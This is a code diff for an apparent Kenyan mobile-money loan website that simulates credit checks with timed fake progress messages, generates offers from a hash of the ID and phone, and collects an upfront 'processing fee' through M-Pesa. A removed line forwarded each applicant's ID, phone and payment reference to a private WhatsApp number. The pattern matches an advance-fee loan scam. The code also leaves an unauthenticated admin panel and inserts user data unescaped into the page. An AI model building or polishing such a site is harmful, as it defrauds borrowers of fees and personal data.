@@ -688,7 +688,7 @@
             background: #cbd5e1;
         }
 
-        /* ===== IMPROVED ADMIN PANEL ===== */
+        /* ===== CLEAN ADMIN PANEL - ONLY APPROVE/DECLINE ===== */
         .admin-panel {
             background: white;
             border-radius: 16px;
@@ -707,50 +707,81 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 15px;
-            flex-wrap: wrap;
-            gap: 10px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #fee2e2;
         }
 
         .admin-header h3 {
             color: #dc2626;
             font-size: 1.1em;
+            font-weight: 600;
         }
 
-        .admin-search {
+        .admin-header span {
+            background: #fee2e2;
+            color: #dc2626;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            font-weight: 600;
+        }
+
+        .admin-filters {
             display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
         }
 
-        .admin-search input {
-            padding: 8px 12px;
+        .admin-filters input {
+            flex: 1;
+            padding: 10px 15px;
             border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            width: 200px;
+            border-radius: 30px;
             font-size: 0.85em;
         }
 
-        .admin-search button {
-            padding: 8px 15px;
+        .admin-filters button {
+            padding: 10px 20px;
             background: #0B4F6C;
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 30px;
             cursor: pointer;
             font-size: 0.85em;
+            font-weight: 500;
         }
 
-        .stats-bar {
+        .admin-filters button:hover {
+            background: #1F7A8C;
+        }
+
+        .admin-stats {
             display: flex;
             gap: 15px;
-            margin-bottom: 15px;
-            padding: 10px;
+            margin-bottom: 20px;
+            padding: 10px 15px;
             background: #f8fafc;
-            border-radius: 8px;
+            border-radius: 30px;
             font-size: 0.85em;
         }
 
-        .app-grid {
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .stat-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .stat-dot.pending { background: #f59e0b; }
+        .stat-dot.approved { background: #10b981; }
+        .stat-dot.declined { background: #ef4444; }
+
+        .applications-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 15px;
@@ -763,55 +794,106 @@
             background: #f8fafc;
             border-radius: 12px;
             padding: 15px;
+            border-left: 4px solid;
+            transition: transform 0.2s;
+        }
+
+        .app-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .app-card.pending { border-left-color: #f59e0b; }
+        .app-card.approved { border-left-color: #10b981; }
+        .app-card.declined { border-left-color: #ef4444; }
+
+        .app-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .app-id {
+            font-weight: 600;
+            color: #0B4F6C;
+            font-size: 0.9em;
+        }
+
+        .app-status {
+            font-size: 0.7em;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        .app-status.pending { background: #fef3c7; color: #f59e0b; }
+        .app-status.approved { background: #d1fae5; color: #10b981; }
+        .app-status.declined { background: #fee2e2; color: #ef4444; }
+
+        .app-details {
+            margin: 10px 0;
             font-size: 0.85em;
-            border-left: 4px solid transparent;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
 
-        .app-card.pending {
-            border-left-color: #f59e0b;
+        .app-details div {
+            margin: 5px 0;
+            color: #4b5563;
         }
 
-        .app-card.approved {
-            border-left-color: #10b981;
-        }
-
-        .app-card.declined {
-            border-left-color: #ef4444;
+        .app-details strong {
+            color: #1e293b;
+            width: 70px;
+            display: inline-block;
         }
 
         .app-actions {
             display: flex;
-            gap: 8px;
-            margin-top: 12px;
+            gap: 10px;
+            margin-top: 15px;
         }
 
-        .app-btn {
-            padding: 6px 15px;
+        .action-btn {
+            flex: 1;
+            padding: 8px;
             border: none;
             border-radius: 6px;
-            cursor: pointer;
+            font-weight: 600;
             font-size: 0.8em;
-            font-weight: 500;
-            flex: 1;
+            cursor: pointer;
+            transition: all 0.2s;
         }
 
-        .approve-btn {
+        .action-btn.approve {
             background: #10b981;
             color: white;
         }
 
-        .approve-btn:hover {
+        .action-btn.approve:hover {
             background: #059669;
         }
 
-        .decline-btn {
+        .action-btn.decline {
             background: #ef4444;
             color: white;
         }
 
-        .decline-btn:hover {
+        .action-btn.decline:hover {
             background: #dc2626;
+        }
+
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .empty-state {
+            grid-column: 1/-1;
+            text-align: center;
+            padding: 40px;
+            background: #f8fafc;
+            border-radius: 12px;
+            color: #94a3b8;
         }
 
         /* ===== LENDERS BAR ===== */
@@ -1047,17 +1129,12 @@
                 flex-direction: column;
             }
             
-            .admin-search {
+            .admin-filters {
                 flex-direction: column;
-                width: 100%;
             }
             
-            .admin-search input {
-                width: 100%;
-            }
-            
-            .stats-bar {
-                flex-wrap: wrap;
+            .applications-grid {
+                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -1071,7 +1148,7 @@
                 <a onclick="showStep(1); return false;">Home</a>
                 <a onclick="alert('How It Works:\n\n1. Verify your ID and M-Pesa number\n2. Get your personalized loan offer\n3. Pay processing fee\n4. Receive funds within minutes'); return false;">How It Works</a>
                 <a onclick="alert('Frequently Asked Questions\n\nQ: What are the interest rates?\nA: 6.5% - 9% per month (reducing balance)\n\nQ: How long does disbursement take?\nA: 5-10 minutes after approval\n\nQ: Can I repay early?\nA: Yes, no penalties\n\nQ: What if I\'m CRB listed?\nA: We consider all applications'); return false;">FAQ</a>
-                <a onclick="alert('Contact us:\n\nEmail: support@scbquickloans.co.ke\n\nWhatsApp: 0715 365500\n\nHours: Mon-Sat 8am-8pm'); return false;">Contact</a>
+                <a onclick="alert('Contact us:\n\nEmail: support@scbquickloans.co.ke'); return false;">Contact</a>
                 <a href="#" class="admin-link" onclick="toggleAdminPanel(); return false;">Admin</a>
             </nav>
         </div>
@@ -1440,32 +1517,32 @@
                     
                     <h3>7. Contact Us</h3>
                     <p>For privacy-related inquiries, contact our Data Protection Officer at:<br>
-                    Email: dpo@scbquickloans.co.ke<br>
-                    Phone: 0715 365500</p>
+                    Email: dpo@scbquickloans.co.ke</p>
                     
                     <p style="margin-top:20px; font-style:italic;">Last Updated: March 15, 2026</p>
                 </div>
             </div>
         </div>
 
-        <!-- IMPROVED ADMIN PANEL -->
+        <!-- CLEAN ADMIN PANEL - ONLY APPROVE/DECLINE -->
         <div class="admin-panel" id="adminPanel">
             <div class="admin-header">
                 <h3>Applications Dashboard</h3>
-                <div class="admin-search">
-                    <input type="text" id="adminSearch" placeholder="Search ID or phone..." oninput="filterApplications()">
-                    <button onclick="refreshApplications()">Refresh</button>
-                    <button onclick="createTestApplication()" style="background:#f59e0b;">Test</button>
-                    <button onclick="debugStorage()" style="background:#64748b;">Debug</button>
-                </div>
+                <span>Admin Only</span>
             </div>
-            <div class="stats-bar">
-                <div><strong>Total:</strong> <span id="statTotal">0</span></div>
-                <div><strong>Pending:</strong> <span id="statPending" style="color: #f59e0b;">0</span></div>
-                <div><strong>Approved:</strong> <span id="statApproved" style="color: #10b981;">0</span></div>
-                <div><strong>Declined:</strong> <span id="statDeclined" style="color: #ef4444;">0</span></div>
+            
+            <div class="admin-filters">
+                <input type="text" id="adminSearch" placeholder="Search by ID or Phone...">
+                <button onclick="refreshApplications()">Refresh</button>
             </div>
-            <div class="app-grid" id="applicationsList"></div>
+            
+            <div class="admin-stats">
+                <div class="stat-item"><span class="stat-dot pending"></span> Pending: <span id="statPending">0</span></div>
+                <div class="stat-item"><span class="stat-dot approved"></span> Approved: <span id="statApproved">0</span></div>
+                <div class="stat-item"><span class="stat-dot declined"></span> Declined: <span id="statDeclined">0</span></div>
+            </div>
+            
+            <div class="applications-grid" id="applicationsList"></div>
         </div>
 
         <!-- LENDERS BAR -->
@@ -1507,6 +1584,8 @@
 
         // ===== DATA STORAGE =====
         let userDB = JSON.parse(localStorage.getItem('scb_users')) || {};
+        let idToPhoneMap = JSON.parse(localStorage.getItem('scb_id_to_phone')) || {};
+        let phoneToIdMap = JSON.parse(localStorage.getItem('scb_phone_to_id')) || {};
         let applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
 
         // Loan options
@@ -1537,6 +1616,38 @@
             { status: "Cross-referencing CRB data...", detail: "Checking for any negative listings..." },
             { status: "Finalizing your offer...", detail: "Preparing personalized terms..." }
         ];
+
+        // ===== ID-PHONE BINDING FUNCTIONS =====
+        function bindIdAndPhone(idNumber, phoneNumber) {
+            // Store bidirectional binding
+            idToPhoneMap[idNumber] = phoneNumber;
+            phoneToIdMap[phoneNumber] = idNumber;
+            
+            localStorage.setItem('scb_id_to_phone', JSON.stringify(idToPhoneMap));
+            localStorage.setItem('scb_phone_to_id', JSON.stringify(phoneToIdMap));
+            
+            console.log('Bound ID:', idNumber, 'to Phone:', phoneNumber);
+        }
+
+        function checkIdPhoneBinding(idNumber, phoneNumber) {
+            // Check if ID is already bound to a different phone
+            if (idToPhoneMap[idNumber] && idToPhoneMap[idNumber] !== phoneNumber) {
+                return {
+                    valid: false,
+                    message: `This ID number is already registered with phone ${idToPhoneMap[idNumber]}`
+                };
+            }
+            
+            // Check if phone is already bound to a different ID
+            if (phoneToIdMap[phoneNumber] && phoneToIdMap[phoneNumber] !== idNumber) {
+                return {
+                    valid: false,
+                    message: `This phone number is already registered with ID ${phoneToIdMap[phoneNumber]}`
+                };
+            }
+            
+            return { valid: true };
+        }
 
         // ===== VALIDATION FUNCTIONS =====
         function isSafaricom(phone) {
@@ -1577,13 +1688,11 @@
             const id = document.getElementById('idNumber').value;
             const phone = document.getElementById('phoneNumber').value;
             
-            // Only check if both fields have valid formats
             if (id.length >= 5 && isSafaricom(phone)) {
                 const userKey = `user_${id}_${phone}`;
                 const userApps = applications.filter(a => a.userKey === userKey);
                 
                 if (userApps.length > 0) {
-                    // Returning user found - take them directly to status
                     processReturningUser(id, phone);
                 }
             }
@@ -1596,10 +1705,8 @@
             const latestApp = userApps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
 
             if (latestApp) {
-                // Hide consent box for returning users
                 document.getElementById('consentBox').style.display = 'none';
                 
-                // Navigate to step 2
                 showStep(2);
                 document.getElementById('step2Subtitle').innerText = 'Your application status:';
                 document.getElementById('loadingOffer').classList.add('hidden');
@@ -1623,7 +1730,7 @@
                     msgDiv.innerHTML = `
                         <h3 style="margin-bottom:8px;">✅ Approved</h3>
                         <p>KSh ${latestApp.amount.toLocaleString()}</p>
-                        <p style="margin-top:8px; font-size:0.85em;">Waiting disbursement to ${latestApp.phoneNumber}</p>
+                        <p style="margin-top:8px; font-size:0.85em;">Waiting disbursement</p>
                         <p style="margin-top:5px; font-size:0.8em;">Ref: ${latestApp.mpesaRef}</p>
                     `;
                 } else if (latestApp.status === 'declined') {
@@ -1633,7 +1740,6 @@
                         <p>KSh ${latestApp.amount.toLocaleString()}</p>
                         <p style="margin-top:8px;">Your application was declined</p>
                     `;
-                    // Store declined app data for retry
                     declinedAppData = {
                         id: latestApp.id,
                         amount: latestApp.amount,
@@ -1658,16 +1764,13 @@
 
         // ===== STEP NAVIGATION =====
         function showStep(step) {
-            // Hide all steps
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.add('hidden');
             document.getElementById('step4').classList.add('hidden');
             
-            // Show current step
             document.getElementById(`step${step}`).classList.remove('hidden');
             
-            // Update progress indicators
             for (let i = 1; i <= 4; i++) {
                 const prog = document.getElementById(`progress${i}`);
                 prog.classList.remove('active', 'completed');
@@ -1679,7 +1782,6 @@
         }
 
         function navigateToStep(step) {
-            // Only allow navigation to completed or current steps
             if (step <= currentStep) {
                 showStep(step);
             }
@@ -1689,7 +1791,6 @@
         function goBackToOffer() { showStep(2); }
         
         function goToPayment() { 
-            // Update payment amounts
             document.getElementById('modalLoanAmount').innerText = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('modalPaymentAmount').innerText = `KSh ${processingFee.toLocaleString()}`;
             document.getElementById('modalFullLoanAmount').innerText = `KSh ${qualifiedAmount.toLocaleString()}`;
@@ -1704,7 +1805,6 @@
             document.getElementById('consent2').checked = false;
             document.getElementById('consent3').checked = false;
             document.getElementById('mpesaMessage').value = '';
-            // Show consent box for new users
             document.getElementById('consentBox').style.display = 'block';
             showStep(1);
         }
@@ -1713,19 +1813,24 @@
         function processStep1() {
             const id = document.getElementById('idNumber').value;
             const phone = document.getElementById('phoneNumber').value;
+            
+            // Check binding first
+            const bindingCheck = checkIdPhoneBinding(id, phone);
+            if (!bindingCheck.valid) {
+                alert(bindingCheck.message);
+                return;
+            }
+            
             const userKey = `user_${id}_${phone}`;
             currentUserKey = userKey;
             
-            // Double-check for existing applications
             const userApps = applications.filter(a => a.userKey === userKey);
             
             if (userApps.length > 0) {
-                // If they somehow got here, redirect to status
                 processReturningUser(id, phone);
                 return;
             }
 
-            // New user - show loading with spinner then offer
             showStep(2);
             document.getElementById('step2Subtitle').innerText = 'Checking your eligibility...';
             document.getElementById('loadingOffer').classList.remove('hidden');
@@ -1733,10 +1838,9 @@
             document.getElementById('step2Buttons').classList.add('hidden');
             document.getElementById('statusMessage').classList.add('hidden');
 
-            // Simulate lengthy analysis with progress updates (10-20 seconds)
             let progress = 0;
-            const totalTime = 15000; // 15 seconds
-            const intervalTime = 2500; // Update every 2.5 seconds
+            const totalTime = 15000;
+            const intervalTime = 2500;
             let messageIndex = 0;
             
             const progressFill = document.getElementById('progressFill');
@@ -1744,7 +1848,7 @@
             const progressDetail = document.getElementById('progressDetail');
             
             const progressInterval = setInterval(() => {
-                progress += 16.67; // 100/6 ≈ 16.67% per step
+                progress += 16.67;
                 messageIndex++;
                 
                 if (messageIndex < progressMessages.length) {
@@ -1754,11 +1858,9 @@
                 }
             }, intervalTime);
 
-            // Complete the analysis after 15 seconds
             setTimeout(() => {
                 clearInterval(progressInterval);
                 
-                // Generate consistent offer based on ID+phone
                 const hash = generateHash(id + phone);
                 const loan = loans[hash % loans.length];
                 
@@ -1766,7 +1868,7 @@
                 processingFee = loan.fee;
                 interestRate = loan.rate;
                 
-                // Save user data
+                // Save user data and bind ID and phone
                 userDB[userKey] = { 
                     id, 
                     phone, 
@@ -1777,7 +1879,9 @@
                 };
                 localStorage.setItem('scb_users', JSON.stringify(userDB));
                 
-                // Update UI
+                // Create permanent binding
+                bindIdAndPhone(id, phone);
+                
                 document.getElementById('offerAmount').innerText = `KSh ${qualifiedAmount.toLocaleString()}`;
                 document.getElementById('offerFee').innerText = `Fee: KSh ${processingFee.toLocaleString()}`;
                 document.getElementById('offerRate').innerText = (interestRate * 100) + '%';
@@ -1838,15 +1942,12 @@
             closeRetryModal();
             
             if (declinedAppData) {
-                // Restore the loan offer
                 qualifiedAmount = declinedAppData.amount;
                 processingFee = declinedAppData.fee;
                 
-                // Pre-fill the form
                 document.getElementById('idNumber').value = declinedAppData.idNumber;
                 document.getElementById('phoneNumber').value = declinedAppData.phoneNumber;
                 
-                // Go directly to payment
                 goToPayment();
             }
         }
@@ -1859,7 +1960,6 @@
                 return;
             }
             
-            // Extract code from message (look for alphanumeric code)
             const codeMatch = msg.match(/[A-Z0-9]{6,12}/);
             const mpesaCode = codeMatch ? codeMatch[0] : msg.substring(0, 10).toUpperCase();
             
@@ -1882,102 +1982,47 @@
             
             applications.push(application);
             localStorage.setItem('scb_apps', JSON.stringify(applications));
-            console.log('Application saved:', application); // Debug log
             
-            // Update user data
             if (userDB[userKey]) {
                 userDB[userKey].lastApplication = application.id;
                 userDB[userKey].lastApplied = new Date().toISOString();
                 localStorage.setItem('scb_users', JSON.stringify(userDB));
             }
             
-            // WhatsApp notification
+            // WhatsApp notification (number removed as requested)
             const message = `🔔 NEW APPLICATION%0AID: ${id}%0APhone: ${phone}%0ALoan: KSh ${qualifiedAmount}%0AFee: KSh ${processingFee}%0ARef: ${mpesaCode}%0ATenure: ${selectedTenure}mo`;
-            window.open(`https://wa.me/254715365500?text=${message}`, '_blank');
             
-            // Show confirmation
             document.getElementById('confirmationRef').innerHTML = `<strong>Reference:</strong> ${mpesaCode}`;
             showStep(4);
         }
 
-        // ===== IMPROVED ADMIN FUNCTIONS =====
-
-        // Debug function to check localStorage
-        function debugStorage() {
-            console.log('=== LOCALSTORAGE DEBUG ===');
-            console.log('All keys:', Object.keys(localStorage));
-            console.log('scb_apps:', localStorage.getItem('scb_apps'));
-            console.log('scb_users:', localStorage.getItem('scb_users'));
-            
-            try {
-                const apps = JSON.parse(localStorage.getItem('scb_apps') || '[]');
-                console.log('Parsed apps:', apps);
-                alert(`Found ${apps.length} applications. Check console for details.`);
-            } catch (e) {
-                console.error('Error parsing apps:', e);
-                alert('Error parsing applications. Check console.');
+        // ===== CLEAN ADMIN FUNCTIONS =====
+        function toggleAdminPanel() {
+            const panel = document.getElementById('adminPanel');
+            panel.classList.toggle('visible');
+            if (panel.classList.contains('visible')) {
+                refreshApplications();
             }
         }
 
-        // Create a test application
-        function createTestApplication() {
-            const testApp = {
-                id: 'TEST-' + Date.now(),
-                userKey: 'user_12345678_0712345678',
-                idNumber: '12345678',
-                phoneNumber: '0712345678',
-                amount: 30000,
-                fee: 500,
-                mpesaRef: 'TEST' + Math.random().toString(36).substring(2,8).toUpperCase(),
-                tenure: 3,
-                status: 'pending',
-                timestamp: new Date().toISOString()
-            };
-            
-            applications.push(testApp);
-            localStorage.setItem('scb_apps', JSON.stringify(applications));
-            console.log('Test application created:', testApp);
-            loadApplications();
-        }
-
-        // Load applications with debugging
         function loadApplications() {
-            console.log('Loading applications...');
-            
-            // Get applications from storage
-            const stored = localStorage.getItem('scb_apps');
-            console.log('Raw localStorage data:', stored);
-            
-            let filtered = applications;
-            if (stored) {
-                try {
-                    filtered = JSON.parse(stored);
-                    console.log('Parsed applications:', filtered);
-                } catch (e) {
-                    console.error('Error parsing applications:', e);
-                    filtered = [];
-                }
-            }
-            
             const searchTerm = document.getElementById('adminSearch').value.toLowerCase();
             
+            let filtered = applications;
             if (searchTerm) {
-                filtered = filtered.filter(a => 
+                filtered = applications.filter(a => 
                     (a.idNumber && a.idNumber.includes(searchTerm)) || 
-                    (a.phoneNumber && a.phoneNumber.includes(searchTerm)) || 
-                    (a.mpesaRef && a.mpesaRef.toLowerCase().includes(searchTerm))
+                    (a.phoneNumber && a.phoneNumber.includes(searchTerm))
                 );
             }
             
             filtered.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
             
             // Update stats
-            const total = filtered.length;
             const pending = filtered.filter(a => a.status === 'pending').length;
             const approved = filtered.filter(a => a.status === 'approved').length;
             const declined = filtered.filter(a => a.status === 'declined').length;
             
-            document.getElementById('statTotal').innerText = total;
             document.getElementById('statPending').innerText = pending;
             document.getElementById('statApproved').innerText = approved;
             document.getElementById('statDeclined').innerText = declined;
@@ -1987,109 +2032,64 @@
             
             if (filtered.length === 0) {
                 list.innerHTML = `
-                    <div style="grid-column:1/-1; text-align:center; padding:40px; background:#f8fafc; border-radius:12px;">
+                    <div class="empty-state">
                         <div style="font-size:3em; margin-bottom:10px;">📭</div>
-                        <h3 style="color:#64748b; margin-bottom:5px;">No Applications Yet</h3>
-                        <p style="color:#94a3b8; font-size:0.9em;">Applications will appear here once users submit them.</p>
-                        <button onclick="createTestApplication()" style="margin-top:15px; padding:8px 20px; background:#0B4F6C; color:white; border:none; border-radius:6px; cursor:pointer;">Create Test Application</button>
+                        <h3 style="color:#64748b;">No Applications Yet</h3>
+                        <p style="color:#94a3b8;">Applications will appear here once users submit them.</p>
                     </div>
                 `;
                 return;
             }
             
-            filtered.forEach((app, index) => {
+            filtered.forEach(app => {
                 const div = document.createElement('div');
                 div.className = `app-card ${app.status || 'pending'}`;
                 
-                // Format date
                 const date = app.timestamp ? new Date(app.timestamp) : new Date();
-                const formattedDate = date.toLocaleString();
-                
-                let actions = '';
-                if (app.status === 'pending') {
-                    actions = `
-                        <button class="app-btn approve-btn" onclick="updateAppStatus('${app.id || index}', 'approved')">✓ Approve</button>
-                        <button class="app-btn decline-btn" onclick="updateAppStatus('${app.id || index}', 'declined')">✗ Decline</button>
-                    `;
-                } else {
-                    actions = `<span style="color:${app.status === 'approved' ? '#10b981' : '#ef4444'}; font-weight:500;">${(app.status || 'unknown').toUpperCase()}</span>`;
-                }
+                const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
                 
                 div.innerHTML = `
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="background:${app.status === 'pending' ? '#f59e0b' : app.status === 'approved' ? '#10b981' : '#ef4444'}; color:white; padding:2px 8px; border-radius:12px; font-size:0.7em;">${app.status || 'unknown'}</span>
-                        <span style="color:#64748b; font-size:0.7em;">${formattedDate}</span>
+                    <div class="app-header">
+                        <span class="app-id">${app.idNumber}</span>
+                        <span class="app-status ${app.status || 'pending'}">${app.status || 'pending'}</span>
                     </div>
-                    <div><strong>ID:</strong> ${app.idNumber || 'N/A'}</div>
-                    <div><strong>Phone:</strong> ${app.phoneNumber || 'N/A'}</div>
-                    <div><strong>Loan:</strong> KSh ${(app.amount || 0).toLocaleString()}</div>
-                    <div><strong>Fee:</strong> KSh ${(app.fee || 0).toLocaleString()}</div>
-                    <div><strong>Ref:</strong> ${app.mpesaRef || 'N/A'}</div>
-                    <div><strong>Tenure:</strong> ${app.tenure || 3} months</div>
-                    <div class="app-actions" style="margin-top:10px;">
-                        ${actions}
+                    <div class="app-details">
+                        <div><strong>Phone:</strong> ${app.phoneNumber}</div>
+                        <div><strong>Loan:</strong> KSh ${(app.amount || 0).toLocaleString()}</div>
+                        <div><strong>Fee:</strong> KSh ${(app.fee || 0).toLocaleString()}</div>
+                        <div><strong>Ref:</strong> ${app.mpesaRef || 'N/A'}</div>
+                        <div><strong>Date:</strong> ${formattedDate}</div>
                     </div>
+                    ${app.status === 'pending' ? `
+                        <div class="app-actions">
+                            <button class="action-btn approve" onclick="updateAppStatus('${app.id}', 'approved')">✓ Approve</button>
+                            <button class="action-btn decline" onclick="updateAppStatus('${app.id}', 'declined')">✗ Decline</button>
+                        </div>
+                    ` : ''}
                 `;
                 list.appendChild(div);
             });
         }
 
-        // Update application status
         function updateAppStatus(appId, status) {
-            console.log('Updating app:', appId, 'to status:', status);
-            
-            // Find by id property or by array index if id is a number
-            let index = -1;
-            
-            // Try to find by id first
-            index = applications.findIndex(a => a.id === appId);
-            
-            // If not found, try to find by index (for test apps)
-            if (index === -1 && !isNaN(appId)) {
-                index = parseInt(appId);
-            }
-            
-            if (index !== -1 && applications[index]) {
+            const index = applications.findIndex(a => a.id === appId);
+            if (index !== -1) {
                 applications[index].status = status;
                 applications[index].lastUpdated = new Date().toISOString();
                 localStorage.setItem('scb_apps', JSON.stringify(applications));
-                console.log('Application updated:', applications[index]);
-                loadApplications();
                 
-                // Show feedback
                 const toast = document.getElementById('toast');
                 toast.textContent = `Application ${status}`;
                 toast.style.display = 'block';
                 setTimeout(() => toast.style.display = 'none', 2000);
-            } else {
-                console.error('Application not found:', appId);
-                alert('Application not found. Please refresh and try again.');
-            }
-        }
-
-        // Refresh applications
-        function refreshApplications() {
-            console.log('Refreshing applications...');
-            applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
-            console.log('Loaded applications:', applications);
-            loadApplications();
-        }
-
-        // Filter applications
-        function filterApplications() {
-            loadApplications();
-        }
-
-        // Toggle admin panel
-        function toggleAdminPanel() {
-            const panel = document.getElementById('adminPanel');
-            panel.classList.toggle('visible');
-            if (panel.classList.contains('visible')) {
-                // Force reload applications from storage
-                applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
-                console.log('Admin panel opened, applications:', applications);
+                
                 loadApplications();
             }
+        }
+
+        function refreshApplications() {
+            applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
+            loadApplications();
         }
 
         // ===== COPY FUNCTIONS =====
@@ -2113,20 +2113,12 @@
         document.addEventListener('DOMContentLoaded', function() {
             checkStep1Complete();
             showStep(1);
-            
-            // Ensure consent box is visible for new users
             document.getElementById('consentBox').style.display = 'block';
-            
-            // Check if there are any stored applications
-            const stored = localStorage.getItem('scb_apps');
-            if (stored) {
-                try {
-                    applications = JSON.parse(stored);
-                    console.log('Loaded applications on init:', applications);
-                } catch (e) {
-                    console.error('Error loading applications:', e);
-                }
-            }
+        });
+
+        // Add search listener
+        document.getElementById('adminSearch').addEventListener('input', function() {
+            loadApplications();
         });
     </script>
 </body>
